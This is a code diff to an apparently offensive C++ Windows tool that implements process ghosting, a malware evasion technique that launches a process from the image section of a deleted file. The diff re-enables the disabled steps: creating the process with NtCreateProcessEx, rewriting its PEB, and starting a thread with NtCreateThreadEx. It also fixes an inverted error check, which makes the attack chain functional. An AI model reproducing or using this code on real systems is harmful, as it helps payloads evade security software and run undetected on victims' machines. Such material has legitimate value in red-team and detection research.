@@ -106,35 +106,28 @@ wmain(const int argc, const wchar_t** argv) -> int
     GhostFile.Close();
 
 
-    // TODO restore
-#if 0
     //
     // 6. Create a process using the image section.
     //
-    UniqueHandle hProcess {
-        [&hSection]() -> HANDLE
-        {
-            HANDLE h;
-            return NT_SUCCESS(pwn::Resolver::ntdll::NtCreateProcessEx(
-                       &h,
-                       PROCESS_ALL_ACCESS,
-                       nullptr,
-                       ::GetCurrentProcess(),
-                       0,
-                       hSection.get(),
-                       nullptr,
-                       nullptr,
-                       false)) ?
-                       h :
-                       nullptr;
-        }()};
-    if ( !hProcess )
+
+    HANDLE hProcess;
+    if ( !NT_SUCCESS(pwn::Resolver::ntdll::NtCreateProcessEx(
+             &hProcess,
+             PROCESS_ALL_ACCESS,
+             nullptr,
+             ::GetCurrentProcess(),
+             0,
+             hSection.get(),
+             nullptr,
+             nullptr,
+             false)) )
     {
         Log::perror("NtCreateProcessEx");
         return EXIT_FAILURE;
     }
 
-    Process::Process GhostedProcess(::GetProcessId(hProcess.get()), hProcess.get()};
+    Process::Process GhostedProcess(std::move(hProcess));
+
     ok("Process created with PID={}", GhostedProcess.ProcessId());
 
 
@@ -142,29 +135,30 @@ wmain(const int argc, const wchar_t** argv) -> int
     // 7. Assign process arguments and environment variables.
     //
 
+    Process::Memory GhostedProcessMemory(GhostedProcess);
 
-    auto PebRaw = Value(GhostedProcess.Memory.Read((uptr)GhostedProcess.ProcessEnvironmentBlock(), sizeof(PEB)));
+    auto PebRaw = Value(GhostedProcessMemory.Read((uptr)GhostedProcess.ProcessEnvironmentBlock(), sizeof(PEB)));
     auto Peb    = reinterpret_cast<PEB*>(PebRaw.data());
     Binary::PE PeTarget {GhostProcessPath};
     Peb->ImageBaseAddress =
         (PVOID)((uptr)(std::get<Binary::PE::PeHeader64>(PeTarget.Header()).OptionalHeader.AddressOfEntryPoint));
-    GhostedProcess.Memory.Write((uptr)GhostedProcess.ProcessEnvironmentBlock(), PebRaw);
+    GhostedProcessMemory.Write((uptr)GhostedProcess.ProcessEnvironmentBlock(), PebRaw);
     dbg("Overwriting PEB in process PID={}", GhostedProcess.ProcessId());
 
 
     //
     // 8. Create a thread to execute in the process.
     //
-    const uptr StartAddress = 0;
+    uptr StartAddress = 0;
     UniqueHandle hThread {
-        [&hProcess, &StartAddress]() -> HANDLE
+        [&StartAddress, &GhostedProcess]() -> HANDLE
         {
             HANDLE h;
             return NT_SUCCESS(pwn::Resolver::ntdll::NtCreateThreadEx(
                        &h,
                        THREAD_ALL_ACCESS,
                        nullptr,
-                       hProcess.get(),
+                       GhostedProcess.Handle(),
                        (LPTHREAD_START_ROUTINE)StartAddress,
                        nullptr,
                        false,
@@ -175,7 +169,7 @@ wmain(const int argc, const wchar_t** argv) -> int
                        h :
                        nullptr;
         }()};
-    if ( hThread )
+    if ( !hThread )
     {
         Log::perror("NtCreateThreadEx");
         return EXIT_FAILURE;
@@ -185,7 +179,6 @@ wmain(const int argc, const wchar_t** argv) -> int
        hThread.get(),
        StartAddress,
        GhostedProcess.ProcessId());
-#endif
 
     Utils::Pause();
 
